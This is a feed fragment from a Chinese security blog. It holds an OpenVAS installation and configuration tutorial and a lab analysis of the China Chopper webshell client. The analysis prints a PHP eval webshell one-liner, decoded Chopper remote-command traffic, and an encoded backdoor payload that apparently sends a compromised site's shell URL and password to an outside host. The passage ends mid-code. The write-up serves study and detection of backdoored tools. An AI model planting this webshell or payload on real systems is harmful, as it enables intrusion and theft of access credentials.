      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;&lt;img alt data-src=&quot;https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200219113036.png&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="OWASP" scheme="https://www.mad-coding.cn/tags/OWASP/"/>
    
  </entry>
  
  <entry>
    <title>kali中安装openvas扫描器</title>
    <link href="https://www.mad-coding.cn/2020/02/16/kali%E4%B8%AD%E5%AE%89%E8%A3%85openvas%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    <id>https://www.mad-coding.cn/2020/02/16/kali中安装openvas扫描器/</id>
    <published>2020-02-16T13:05:48.000Z</published>
    <updated>2020-02-20T07:00:12.181Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这几天公司安排一个内部的众测任务，使用nessus扫描了以后没有发现什么漏洞，所以就安装下openvas来扫描试试。</p><a id="more"></a><h1 id="0x01-openvas简介"><a href="#0x01-openvas简介" class="headerlink" title="0x01 openvas简介"></a>0x01 openvas简介</h1><p>OpenVAS是开放式漏洞评估系统，也可以说它是一个包含着相关工具的网络扫描器。其核心部件是一个服务器，包括一套网络漏洞测试程序，可以检测远程系统和应用程序中的安全问题。</p><p><strong>OpenVAS**</strong>系统架构**</p><p><img alt="image001.jpg" data-src="https://image.3001.net/images/20170427/14932859869783.jpg!small" class="lozad"></p><table><thead><tr><th><strong>服务器层组件（建议都安装）</strong></th><th><strong>客户层组件（任选其一安装即可）</strong></th><th><strong>服务器层组件（建议都安装）</strong></th><th><strong>客户层组件（任选其一安装即可）</strong></th></tr></thead><tbody><tr><td>OpenVAS-scanner(扫描器)</td><td>负责调用各种漏洞检测插件，完成实际的扫描操作。</td><td>OpenVAS-cli（命令行接口）</td><td>负责提供从命令行访问OpenVAS服务层程序。</td></tr><tr><td>OpenVAS-manager(管理器)</td><td>负责分配扫描任务，并根据扫描结果生产评估报告。</td><td>Greenbone-security-assistant(安全助手)</td><td>负责提供访问OpenVAS服务层的Web接口，便于通过浏览器来建立扫描任务，是使用最简便的客户层组件。</td></tr><tr><td>OpenVAS-administrator(管理者)</td><td>负责管理配置信息，用户授权等相关工作。</td><td>Greenbone-Desktop-Suite(桌面套件)</td><td>负责提供访问OpenVAS服务层的图形程序界面，主要在windows系统中使用。</td></tr></tbody></table><h1 id="0x02-openvas的安装"><a href="#0x02-openvas的安装" class="headerlink" title="0x02 openvas的安装"></a>0x02 openvas的安装</h1><p><strong>安装</strong></p><blockquote><p>apt-get install openvas</p></blockquote><p><strong>初始化</strong></p><blockquote><p>openvas-setup</p><p>注：这个过程有点长</p></blockquote><p><strong>检查安装结果</strong></p><blockquote><p>openvas-check-setup(如果出错，使用openvas-check-setup | grep FIX)</p></blockquote><p>出现下图说明安装成功</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200218173322.png" class="lozad"></p><p>创建用户</p><blockquote><p>openvasmd –create-user 用户名</p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200218214939.png" class="lozad"></p><p>修改密码</p><blockquote><p>openvasmd –user 用户名–new-password ‘新密码’</p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200218215007.png" class="lozad"></p><p>启动openvas服务</p><blockquote><p>openvas-start(每次重启电脑都要重启服务)</p></blockquote><p>访问网址</p><blockquote><p><a href="https://127.0.0.1:9392" target="_blank" rel="noopener">https://127.0.0.1:9392</a></p></blockquote><p>升级插件和漏洞库</p><blockquote><p>方法一：</p><p># openvas-feed-update //初始化安装，可以不用更新</p></blockquote><blockquote><p>方法二：</p><p># greenbone-nvt-sync</p><p># greenbone-scapdata-sync  </p><p># greenbone-certdata-sync</p><p>建议使用方法一进行升级。</p></blockquote><h1 id="0x03-配置外部访问"><a href="#0x03-配置外部访问" class="headerlink" title="0x03 配置外部访问"></a>0x03 配置外部访问</h1><p>安装完成后，openvas默认设置的监听地址为127.0.0.1，每次使用都只能用linux虚拟机打开浏览器通过<a href="https://127.0.0.1:9392/" target="_blank" rel="noopener">https://127.0.0.1:9392</a>来进行登录扫描，不如通过自己的电脑浏览器连接到openvas服务器直接进行扫描来的方便。</p><p>如果openvas安装在远程服务器或者虚拟机里面，则必须用服务器或者虚拟机打开浏览器来扫描，这样比较麻烦。用户更加希望，通过自己的电脑浏览器连接到openvas服务器，直接进行扫描。下面介绍配置外部访问的方法：</p><p>openvas新版本有两种方式控制openvas的开关，一种是服务的方式，一种是脚本的方式。</p><h2 id="3-1-服务的方式"><a href="#3-1-服务的方式" class="headerlink" title="3.1 服务的方式"></a>3.1 服务的方式</h2><p>这种方式是通过openvas-start/openvas-stop脚本启动和关闭的，这两个脚本里调用的是service指令。启动openvas服务的脚本都存放在/lib/systemd/system下。</p><p>修改三个配置文件openvas-manager.service，openvas-scanner.service和greenbone-security-assistant.service，将配置文件中的监听IP由127.0.0.1改为0.0.0.0（相比于更改为openvas服务器的实际IP地址，改为0.0.0.0会更好，因为0.0.0.0代表本机的任意地址，适用于服务器有多个IP或者服务器IP有变动的情况）。具体操作如下</p><p>leafpad /lib/systemd/system/greenbone-security-assistant.service</p><p>（1）修改greenbone-security-assistant.service监听地址</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220101849.png" class="lozad"></p><p>（2）增加host 头主机地址（IP或域名）</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220102345.png" class="lozad"></p><p><strong>解释：</strong></p><p>如果不加主机头，访问时会出现以下错误。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The request contained an unknown or invalid Host header. If you are trying to access GSA via its hostname or a proxy, make sure GSA is set up to allow it.</span><br></pre></td></tr></table></figure><p>（3）修改openvas-manager.service监听地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mousepad /lib/systemd/system/openvas-manager.service</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220102451.png" class="lozad"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#管理器：与接口通信，分配扫描任务，并根据扫描结果生成评估报告，默认端口为9390</span></span><br><span class="line">mousepad /etc/default/openvas-manager</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220102855.png" class="lozad"></p><p>（6）修改greenbone-security-assistant监听地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#访问web 端接口(gsad):访问opebvas 服务层的web 接口，默认监听地址为127.0.0.1，端口为9392</span></span><br><span class="line">mousepad /etc/default/greenbone-security-assistant</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220103233.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220103308.png" class="lozad"></p><p>（7）重新加载systemctl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#关闭openvas</span></span><br><span class="line">openvas-stop </span><br><span class="line"><span class="comment">#重新载入配置</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line"><span class="comment">#启动openvas</span></span><br><span class="line">openvas-start</span><br><span class="line"><span class="comment">#安装完整性检测</span></span><br><span class="line">openvas-check-setup</span><br></pre></td></tr></table></figure><p>成功使用本机浏览器访问</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220103810.png" class="lozad"></p><h1 id="0x04-openvas的使用"><a href="#0x04-openvas的使用" class="headerlink" title="0x04 openvas的使用"></a>0x04 openvas的使用</h1><h2 id="4-1-建立一个扫描目标"><a href="#4-1-建立一个扫描目标" class="headerlink" title="4.1 建立一个扫描目标"></a>4.1 <strong>建立一个扫描目标</strong></h2><p>新建扫描目标Configuration→Targets→New</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220104632.png" class="lozad"></p><p>Openvas扫描主机时可以手工输入，也可以通过文件导入。有默认配置好的扫描端口列表及存活测试，可根据实际情况下拉选择</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220104746.png" class="lozad"></p><p>端口扫描列表可以通过星型图标创建自定义端口扫描策略。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220104841.png" class="lozad"></p><p>同样，通过星型图标可创建登录凭证。   在已知主机账号密码时可以进行登录扫描。    </p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220104931.png" class="lozad"></p><h2 id="4-2-建立一个新的扫描任务"><a href="#4-2-建立一个新的扫描任务" class="headerlink" title="4.2  建立一个新的扫描任务"></a>4.2  <strong>建立一个新的扫描任务</strong></h2><p>建立完扫描目标之后，需要建立扫描任务关联扫描目标。</p><p>建立扫描任务有两种方式：</p><p><strong>（1）使用任务向导进行任务的创建</strong></p><p>任务向导可以快速的建立并开启一个扫描任务；高级任务向导有更详细的选项，如登录凭证之类的信息；修改任务向导可以快速的选择之前创建的任务重新创建任务开启扫描。任务向导中没有填写的选项都按照设置（Extras→My Settings）的默认配置进行扫描任务配置。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220105953.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220110151.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220110313.png" class="lozad"></p><p>（2）通过星型图标新建任务创建扫描任务，</p><p>星型图标新建任务创建扫描任务，内容较详细。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220110428.png" class="lozad"></p><p>填写的内容可以根据实际的情况适当的增减，不需要都填写。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220114528.png" class="lozad"></p><h2 id="4-3-自定义扫描策略"><a href="#4-3-自定义扫描策略" class="headerlink" title="4.3 自定义扫描策略"></a>4.3 自定义扫描策略</h2><p>Openvas默认有配置好的扫描策略，如下图所示。</p><blockquote><p>configuration–&gt;scan configs</p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220141655.png" class="lozad"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Discover：只对目标系统进行发现扫描。</span><br><span class="line"></span><br><span class="line">Empty：空策略，不进行任何操作。</span><br><span class="line"></span><br><span class="line">Full and fast：使用全部NVTs并根据扫描前收集的信息进行优化。 </span><br><span class="line"></span><br><span class="line">Full and fast ulitimate：使用全部NVTs（包括一些可以停止服务或主机的）并根据扫描前收集的信息进行优化。</span><br><span class="line"></span><br><span class="line">Full and very deep: 使用全部NVTs但不信任之前收集的信息，较慢。</span><br><span class="line"></span><br><span class="line">Full and very deep ultimate：使用全部NVTs（包括一些可以停止服务或主机的）但不信任之前收集的信息，较慢。</span><br><span class="line"></span><br><span class="line">Host Discovery：主机发现</span><br><span class="line"></span><br><span class="line">System Discovery：系统识别</span><br></pre></td></tr></table></figure><p>我们也可以根据我们的个人需求来定制扫描策略，操作如下。</p><p>点击configuration→scan configs→星型图标新建</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220143858.png" class="lozad"></p><p>选择好NVTs后保存为新的扫描策略。每一个family代表一种漏洞类型，该类型下会集成多个NVTS。Family旁有斜着(Grow)和横(Static)着的两种箭头，选择Grow意味着当openvas官方发布该Family下新的NVTS时，策略会自动添加新的NVTS，然而选择Static时openvas发布新的NVTS，则不会被添加的策略里面。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220144245.png" class="lozad"></p><p>配置完后会在scan configs下多一个新建的扫描策略，在建立扫描任务时，选择该扫描策略就会使用该扫描策略进行扫描</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220143758.png" class="lozad"></p><h2 id="4-4-设置定时扫描"><a href="#4-4-设置定时扫描" class="headerlink" title="4.4 设置定时扫描"></a>4.4 <strong>设置定时扫描</strong></h2><p>当我们需要每天都对系统进行扫描时，OpenVas同样可以帮忙。Openvas可以设置定时扫描任务。点击Configuration→Schedules→星型按钮新建。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220144405.png" class="lozad"></p><p>新建之后，填写以下内容进行配置。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220144437.png" class="lozad"></p><p>完成之后在新建扫描任务的时候需要选择该schedule，在任务套用schedule后启动按钮会变成时钟，此后该任务就会开启定时扫描</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200220144517.png" class="lozad"></p><h1 id="0x05-参考连接"><a href="#0x05-参考连接" class="headerlink" title="0x05 参考连接"></a>0x05 参考连接</h1><p><a href="https://blog.csdn.net/xlsj228/article/details/90766648" target="_blank" rel="noopener">https://blog.csdn.net/xlsj228/article/details/90766648</a></p><p><a href="https://www.cnblogs.com/hftian/p/11017545.html" target="_blank" rel="noopener">https://www.cnblogs.com/hftian/p/11017545.html</a></p><p><a href="https://blog.51cto.com/linhong/2134910?source=drh" target="_blank" rel="noopener">https://blog.51cto.com/linhong/2134910?source=drh</a></p><p><a href="https://www.freebuf.com/column/160541.html" target="_blank" rel="noopener">https://www.freebuf.com/column/160541.html</a></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;这几天公司安排一个内部的众测任务，使用nessus扫描了以后没有发现什么漏洞，所以就安装下openvas来扫描试试。&lt;/p&gt;
    
    </summary>
    
      <category term="神兵利器" scheme="https://www.mad-coding.cn/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
      <category term="扫描器" scheme="https://www.mad-coding.cn/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    
      <category term="openvas" scheme="https://www.mad-coding.cn/tags/openvas/"/>
    
  </entry>
  
  <entry>
    <title>分析菜刀及隐藏后门</title>
    <link href="https://www.mad-coding.cn/2020/02/14/%E5%88%86%E6%9E%90%E8%8F%9C%E5%88%80%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/"/>
    <id>https://www.mad-coding.cn/2020/02/14/分析菜刀及隐藏后门/</id>
    <published>2020-02-14T08:18:27.000Z</published>
    <updated>2020-02-14T11:03:40.424Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今日在合天网安的web课程中看到了分析菜刀后门的实验，然后就跟着实验做了一遍，正好可以学习一下如何分析软件的后门。</p><a id="more"></a><h1 id="0x01-基本知识"><a href="#0x01-基本知识" class="headerlink" title="0x01 基本知识"></a>0x01 基本知识</h1><blockquote><p>中国菜刀</p></blockquote><p>  中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。UINCODE方式编译，支持多国语言输入显示</p><blockquote><p>winsock expert</p></blockquote><p>  一个用来监视和修改网络发送和接收数据的程序，WinSock Expert可以用来帮助您调试网络应用程序，分析网络程序的通信协议（如分析OICQ的发送接收数据），并且在必要的时候能够修改发送的数据</p><blockquote><p>UPX</p></blockquote><p>​      UPX (the Ultimate Packer for eXecutables)是一款先进的可执行程序文件压缩器，压缩过的可执行文件体积缩小50%-70% ，这样减少了磁盘占用空间、网络上传下载的时间和其它分布以及存储费用。 通过 UPX 压缩过的程序和程序库完全没有功能损失和压缩之前一样可正常地运行，对于支持的大多数格式没有运行时间或内存的不利后果。</p><blockquote><p>Wireshark</p></blockquote><p>​      Wireshark是免费的网络协议检测分析程序。让您经由程序抓取运行的网站的相关资讯，包括每一封包流向及其内容、资讯可依操作系统语系看出,方便查看、监控TCP session动态等等。</p><blockquote><p>PEID</p></blockquote><p>​     一款专业很好用的查壳软件，几乎可以侦测出所有的壳，其数量已超过470 种PE文档 的加壳类型和签名，另外还可识别出EXE文件是用什么语言编写的，比如：VC++、Delphi、VB或Delphi等。</p><blockquote><p>工具下载地址：</p></blockquote><h1 id="0x02-分析正常菜刀"><a href="#0x02-分析正常菜刀" class="headerlink" title="0x02 分析正常菜刀"></a>0x02 分析正常菜刀</h1><p>市面上的中国菜刀有很多版本，有些版本可能会被不发分析植入了后门，那么我们怎么知道自己使用的菜刀会不会被植入了后门尼？</p><p>那就来简单的分析下吧，</p><h2 id="2-1-静态分析中国菜刀"><a href="#2-1-静态分析中国菜刀" class="headerlink" title="2.1 静态分析中国菜刀"></a>2.1 静态分析中国菜刀</h2><p>菜刀的文件类型.exe的可执行程序，那么就要分析改工具使用什么语言写的了。</p><p>通过peid等工具可以看出来是使用upx加壳了</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214171019.png" class="lozad"></p><p>在通过winhex查看下，同样显示也是upx加壳</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214171216.png" class="lozad"></p><p>既然加壳了，那就脱壳吧，使用upx脱壳</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214171344.png" class="lozad"></p><p>脱壳成功后在放入peid检测一下看看，得知使用vc++6.0开发的，用C++写的。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214170739.png" class="lozad"></p><h2 id="2-2-动态分析菜刀"><a href="#2-2-动态分析菜刀" class="headerlink" title="2.2 动态分析菜刀"></a>2.2 动态分析菜刀</h2><blockquote><p>环境：</p><p>靶机：Windows server 2003 –192.168.1.134</p><p>攻击机：Windows 7–192.168.1.131</p></blockquote><p>在靶机上写一个php一句话放在网站的根目录下，如caodao.php,内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'chopper'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214171839.png" class="lozad"></p><p>然后在攻击机上使用菜刀连接</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214172006.png" class="lozad"></p><p>成功连接上</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214172119.png" class="lozad"></p><p>开启wireshark监听本地的数据包，</p><p>过滤规则写ip.addr=192.168.1.131,然后返回菜刀，</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214172450.png" class="lozad"></p><p>输入netstat -an | find “ESTABLISHED”或者whoami这类cmd命令</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214172358.png" class="lozad"></p><p>然后在wireshark中找到靶机和攻击机的ip地址</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214172935.png" class="lozad"></p><p>给攻击机和靶机通信的数据包加上颜色，方便查看</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214173126.png" class="lozad"></p><p>找到靶机和攻击机通过HTTP协议通信的数据包，按下图操作，我们可以追踪tcp流来查看整个tcp数据交互过程</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214173401.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214173603.png" class="lozad"></p><p> 上面红色部分为攻击机POST提交控制命令的内容，下面蓝色部分为靶机返回结果</p><p> 从红色部分我们可以看到一共有z0,z1,z2三个参数，我们使用burpsuite自带的decoder模块进行解码</p><p>可以看到红色部分的代码经过base64以及url的编码，我们解码看看</p><p>解码的顺序依次为url解码，然后再base64解码，得到明文</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214174047.png" class="lozad"></p><blockquote><p>z0=@ini_set(“display_errors”,”0”);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(“&gt;|”);;$p=base64_decode($_POST[“z1”]);$s=base64_decode($_POST[“z2”]);$d=dirname($_SERVER[“SCRIPT_FILENAME”]);$c=substr($d,0,1)==”/“?”-c &quot;{$s}&quot;“:”/c &quot;{$s}&quot;“;$r=”{$p} {$c}”;@system($r.” 2&gt;&amp;1”,$ret);print ($ret!=0)?”ret={$ret}”:””;;echo(“|&lt;-“);die();</p></blockquote><blockquote><p>z1=cmd</p></blockquote><blockquote><p>z2=cd /d “C:\phpStudy\PHPTutorial\WWW&quot;&amp;netstat -an | find “ESTABLISHED”&amp;echo [S]&amp;cd&amp;echo [E]</p></blockquote><p> z1的值是cmd，</p><p>z2的值是cd /d “c:\inetpub\wwwroot\”&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]。该操作的意思就是执行输入的cmd命令，列出当前用户与当前目录，执行结果如下所示</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214174310.png" class="lozad"></p><p>我们输入其他的命令的话，当然也是可以通过同样的流程进行分析</p><p>以上就是中国菜刀的流量通信的特征</p><p>了解了正常的菜刀是如何工作的，接下来我们看看被植入恶意后门的菜刀是怎样的。</p><h1 id="0x03-分析后门菜刀"><a href="#0x03-分析后门菜刀" class="headerlink" title="0x03 分析后门菜刀"></a>0x03 分析后门菜刀</h1><p>  为了与前一个菜刀的分析流程进行区分，我们这一步特地选用了另外一个菜刀，使用另外一个抓包软件进行分析。</p><p>  打开菜刀，启动抓包软件WSockExpert，点击左上角的文件夹图标，选择caidao.exe，点击open即可</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214175426.png" class="lozad"></p><p>然后使用带后门的菜刀连接shell，连接虚拟终端执行命令</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214183504.png" class="lozad"></p><p>在winsockExpert中查看菜刀的通信数据</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200214182942.png" class="lozad"></p><blockquote><p>注：由于没有在网上找到带有后门的菜刀，所以下面的数据都是参考网上带有后门菜刀的数据</p></blockquote><p>完整的post内容是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a=%24_%3Dstrrev%28edoced_46esab%29%3B%40eval%28%24_%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGV2YWwo</span><br><span class="line">YmFzZTY0X2RlY29kZSgnYVdZb0pGOURUMDlMU1VWYkoweDVhMlVuWFNFOU1TbDdjMlYwWTI5dmEybGxLQ2RNZVd</span><br><span class="line">0bEp5d3hLVHRBWm1sc1pTZ25hSFIwY0RvdkwzZDNkeTVuYjI5a1pHOW5MbWx1TDBGd2FTNXdhSEEvVlhKc1BTY3VKR</span><br><span class="line">jlUUlZKV1JWSmJKMGhVVkZCZlNFOVRWQ2RkTGlSZlUwVlNWa1ZTV3lkU1JWRlZSVk5VWDFWU1NTZGRMaWNtVUdGem</span><br><span class="line">N6MG5MbXRsZVNna1gxQlBVMVFwS1R0OScpKTtAaW5pX3NldCgiZGlzcGxheV9lcnJvcnMiLCIwIik7QHNldF90aW1lX2xp</span><br><span class="line">bWl0KDApO0BzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoMCk7ZWNobygiLT58Iik7OyREPWRpcm5hbWUoJF9TRVJWR</span><br><span class="line">VJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pO</span><br><span class="line">yRSPSJ7JER9XHQiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpaWYoaX</span><br><span class="line">NfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO30kUi49Ilx0IjskdT0oZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF9nZXRlZ2lkJykpP</span><br><span class="line">0Bwb3NpeF9nZXRwd3VpZChAcG9zaXhfZ2V0ZXVpZCgpKTonJzskdXNyPSgkdSk%2FJHVbJ25hbWUnXTpAZ2V0X2N1cn</span><br><span class="line">JlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Iih7JHVzcn0pIjtwcmludCAkUjs7ZWNobygifDwtIik7ZGllKCk7</span><br></pre></td></tr></table></figure><p>被urlencode+base64了，看着有点乱，先urldecode下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a=$_=strrev(edoced_46esab);@eval($_($_POST[z0]));&amp;z0=QGV2YWwoYmFzZTY0X2RlY29kZSgnYVdZb0pGOURUMDlM</span><br><span class="line">U1VWYkoweDVhMlVuWFNFOU1TbDdjMlYwWTI5dmEybGxLQ2RNZVd0bEp5d3hLVHRBWm1sc1pTZ25hSFIwY0RvdkwzZD</span><br><span class="line">NkeTVuYjI5a1pHOW5MbWx1TDBGd2FTNXdhSEEvVlhKc1BTY3VKRjlUUlZKV1JWSmJKMGhVVkZCZlNFOVRWQ2RkTGlSZlU</span><br><span class="line">wVlNWa1ZTV3lkU1JWRlZSVk5VWDFWU1NTZGRMaWNtVUdGemN6MG5MbXRsZVNna1gxQlBVMVFwS1R0OScpKTtAaW5p</span><br><span class="line">X3NldCgiZGlzcGxheV9lcnJvcnMiLCIwIik7QHNldF90aW1lX2xpbWl0KDApO0BzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUo</span><br><span class="line">MCk7ZWNobygiLT58Iik7OyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGl</span><br><span class="line">ybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9XHQiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2Z</span><br><span class="line">vcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO30kUi49Ilx0IjskdT0oZnV</span><br><span class="line">uY3Rpb25fZXhpc3RzKCdwb3NpeF9nZXRlZ2lkJykpP0Bwb3NpeF9nZXRwd3VpZChAcG9zaXhfZ2V0ZXVpZCgpKTonJzskdXN</span><br><span class="line">yPSgkdSk/JHVbJ25hbWUnXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Iih7JHVzcn0pIjtwcmlud</span><br><span class="line">CAkUjs7ZWNobygifDwtIik7ZGllKCk7_</span><br></pre></td></tr></table></figure><p>毫无疑问，我们需要分析的是z0这个被base64的部分，解码看看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@eval(base64_decode(*aWYoJF9DT09LSUVbJ0x5a2UnXSE9MSl7c2V0Y29va2llKCdMeWtlJywxKTtAZmlsZSgnaHR0cDovL</span><br><span class="line">3d3dy5nb29kZG9nLmluL0FwaS5waHA/VXJsPScuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiRfU0VSVkVSWydSRVFVRVNUX1</span><br><span class="line">VSSSddLicmUGFzcz0nLmtleSgkX1BPU1QpKTt9*));@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_</span><br><span 